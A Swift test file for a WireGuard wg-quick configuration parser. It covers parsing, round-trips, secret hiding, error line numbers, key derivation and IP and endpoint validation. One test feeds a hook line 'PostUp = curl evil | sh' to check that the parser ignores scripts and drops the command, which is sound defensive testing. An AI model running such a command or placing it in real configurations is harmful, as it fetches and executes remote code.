import Foundation
import Testing
@testable import TunnelCore

// Example keys from the wg(8) man page; they protect nothing.
let privA = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
let pubA = "HIgo9xNzJMWLKASShiTqIybxZ0U3wGLiUeJ1PKf8ykw="
let pubB = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg="
let psk = "FpCyhws9cxwWoV4xELtfJvjJN+zQVRPISllRWgeopVE="

let sample = """
[Interface]
# home office
PrivateKey = \(privA)
Address = 10.0.0.2/32, fd00::2/128
DNS = 1.1.1.1, 2606:4700:4700::1111, corp.example
MTU = 1420

[Peer]
PublicKey = \(pubB)
PresharedKey = \(psk)
AllowedIPs = 0.0.0.0/0
AllowedIPs = ::/0
Endpoint = vpn.example.com:51820
PersistentKeepalive = 25
"""

@Suite struct WgQuickTests {
    @Test func parsesFullConfig() throws {
        let result = WgQuick.parse(sample)
        #expect(result.errors.isEmpty)
        let c = try #require(result.configuration)
        #expect(c.interface.privateKey.base64 == privA)
        #expect(c.interface.publicKey.base64 == pubA)
        #expect(c.interface.addresses.map(\.description) == ["10.0.0.2/32", "fd00::2/128"])
        #expect(c.interface.dnsServers == ["1.1.1.1", "2606:4700:4700::1111"])
        #expect(c.interface.dnsSearchDomains == ["corp.example"])
        #expect(c.interface.mtu == 1420)
        #expect(c.peers.count == 1)
        let p = c.peers[0]
        #expect(p.presharedKey?.base64 == psk)
        #expect(p.allowedIPs.map(\.description) == ["0.0.0.0/0", "::/0"])
        #expect(p.endpoint?.description == "vpn.example.com:51820")
        #expect(p.persistentKeepalive == 25)
        #expect(c.isFullTunnel)
    }

    @Test func roundTrips() throws {
        let c = try #require(WgQuick.parse(sample).configuration)
        let again = try #require(WgQuick.parse(WgQuick.serialize(c)).configuration)
        #expect(again == c)
    }

    @Test func serializeCanHideSecrets() throws {
        let c = try #require(WgQuick.parse(sample).configuration)
        let text = WgQuick.serialize(c, includePrivateKey: false)
        #expect(!text.contains(privA))
        #expect(!text.contains(psk))
        #expect(text.contains(pubB))
    }

    @Test func keysAndSectionsAreCaseInsensitive() {
        let text = "[INTERFACE]\nprivatekey = \(privA)\n[peer]\npublickey=\(pubB)\nallowedips=10.0.0.0/8"
        #expect(WgQuick.parse(text).configuration?.peers.first?.allowedIPs.first?.description == "10.0.0.0/8")
    }

    @Test func crlfAndTrailingComments() {
        let text = "[Interface]\r\nPrivateKey = \(privA) # mine\r\n"
        #expect(WgQuick.parse(text).errors.isEmpty)
    }

    @Test(arguments: [
        ("[Interface]\nPrivateKey = nope", 2),
        ("[Interface]\nPrivateKey = \(privA)\nAddress = 10.0.0.256/32", 3),
        ("[Interface]\nPrivateKey = \(privA)\nAddress = 10.0.0.1/33", 3),
        ("[Interface]\nPrivateKey = \(privA)\nBogus = 1", 3),
        ("[Interface]\nPrivateKey = \(privA)\nPrivateKey = \(privA)", 3),
        ("[Interface]\nPrivateKey = \(privA)\n[Peer]\nPublicKey = \(pubB)\nEndpoint = host", 5),
        ("[Interface]\nPrivateKey = \(privA)\n[Peer]\nPublicKey = \(pubB)\nEndpoint = 1.2.3.4:0", 5),
        ("[Interface]\nPrivateKey = \(privA)\n[Peer]\nPublicKey = \(pubB)\nPersistentKeepalive = -1", 5),
        ("[Interface]\nPrivateKey = \(privA)\nMTU = 100", 3),
        ("[Interface]\nPrivateKey = \(privA)\nnot a pair", 3),
        ("[Interface]\nPrivateKey = \(privA)\n[Peer]\nAllowedIPs = 10.0.0.0/8", 3),
        ("[Interface]\nPrivateKey = \(privA)\n[Bogus]", 3),
    ])
    func reportsErrorsWithLineNumbers(text: String, line: Int) {
        let result = WgQuick.parse(text)
        #expect(result.configuration == nil)
        #expect(result.errors.contains { $0.line == line }, "\(result.diagnostics)")
    }

    @Test func missingInterface() {
        #expect(WgQuick.parse("[Peer]\nPublicKey = \(pubB)").errors.contains { $0.message.contains("Missing [Interface]") })
    }

    @Test func secondInterfaceIsAnError() {
        let r = WgQuick.parse("[Interface]\nPrivateKey = \(privA)\n[Interface]\nPrivateKey = \(privA)")
        #expect(r.errors.contains { $0.line == 3 })
    }

    @Test func hooksAreIgnoredWithWarnings() throws {
        let r = WgQuick.parse("[Interface]\nPrivateKey = \(privA)\nPostUp = curl evil | sh\nTable = off")
        let c = try #require(r.configuration)
        #expect(c.interface.ignored.map(\.key) == ["PostUp", "Table"])
        #expect(r.warnings.count == 2)
        #expect(r.warnings[0].message.contains("never runs scripts"))
        #expect(!WgQuick.serialize(c).contains("curl"))
    }

    @Test func controlCharactersAreRejected() {
        let r = WgQuick.parse("[Interface]\nPrivateKey = \(privA)\u{1B}[2J")
        #expect(r.configuration == nil)
    }

    @Test func oversizeInputIsRefusedBeforeParsing() {
        let r = WgQuick.parse(String(repeating: "#", count: WgQuick.maxBytes + 1))
        #expect(r.errors.first?.line == nil)
    }

    @Test func keepaliveOffAndZeroMeanNone() throws {
        for v in ["off", "0"] {
            let c = try #require(WgQuick.parse("[Interface]\nPrivateKey = \(privA)\n[Peer]\nPublicKey = \(pubB)\nPersistentKeepalive = \(v)").configuration)
            #expect(c.peers[0].persistentKeepalive == nil)
        }
    }
}

@Suite struct KeyTests {
    @Test func publicKeyMatchesWg() throws {
        // Example keys from the wg(8) man page; the public key was checked against an independent
        // X25519 implementation (Python cryptography), not derived with CryptoKit.
        let priv = try #require(WireGuardKey(base64: privA))
        #expect(KeyPair.publicKey(for: priv).base64 == pubA)
    }

    @Test func generatedKeysAreClampedAndDistinct() {
        let a = KeyPair.generatePrivateKey(), b = KeyPair.generatePrivateKey()
        #expect(a != b)
        #expect(a.rawValue[0] & 7 == 0)
        #expect(a.rawValue[31] & 128 == 0 && a.rawValue[31] & 64 == 64)
    }

    @Test(arguments: ["", "short", String(repeating: "A", count: 44), privA + "=", "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBm=="])
    func rejectsMalformed(text: String) {
        #expect(WireGuardKey(base64: text) == nil)
    }

    @Test func hexRoundTrip() throws {
        let k = try #require(WireGuardKey(base64: pubB))
        #expect(WireGuardKey(hex: k.hex) == k)
        #expect(WireGuardKey(hex: "zz" + String(k.hex.dropFirst(2))) == nil)
    }

    @Test func descriptionNeverPrintsTheKey() throws {
        let k = try #require(WireGuardKey(base64: privA))
        #expect(!"\(k)".contains(privA))
    }
}

@Suite struct AddressTests {
    @Test(arguments: ["10.0.0.1", "10.0.0.0/8", "0.0.0.0/0", "::/0", "fd00::1/128", "2001:db8::/32"])
    func valid(text: String) { #expect(IPAddressRange(text) != nil) }

    @Test(arguments: ["10.1", "10.0.0.1/", "10.0.0.1/33", "fd00::/129", "fe80::1%en0", "host", "10.0.0.1/+8", "1.2.3.4/08x"])
    func invalid(text: String) { #expect(IPAddressRange(text) == nil) }

    @Test func containsAndOverlaps() throws {
        let net = try #require(IPAddressRange("10.0.0.0/8"))
        let host = try #require(IPAddressRange("10.1.2.3/32"))
        let other = try #require(IPAddressRange("192.168.0.0/16"))
        #expect(net.contains(host) && !host.contains(net))
        #expect(net.overlaps(host) && !net.overlaps(other))
        #expect(IPAddressRange("10.0.0.7/24")?.network.description == "10.0.0.0/24")
    }

    @Test(arguments: [("1.2.3.4:51820", "1.2.3.4:51820"), ("[2001:db8::1]:51820", "[2001:db8::1]:51820"), ("VPN.Example.com:443", "vpn.example.com:443")])
    func endpoints(text: String, expected: String) { #expect(Endpoint(text)?.description == expected) }

    @Test(arguments: ["1.2.3.4", "2001:db8::1:51820", "[2001:db8::1]51820", "host:99999", "bad_host:1", "-x.com:1", "1.2.3.999:1", "[fe80::1%en0]:1"])
    func badEndpoints(text: String) { #expect(Endpoint(text) == nil) }
}
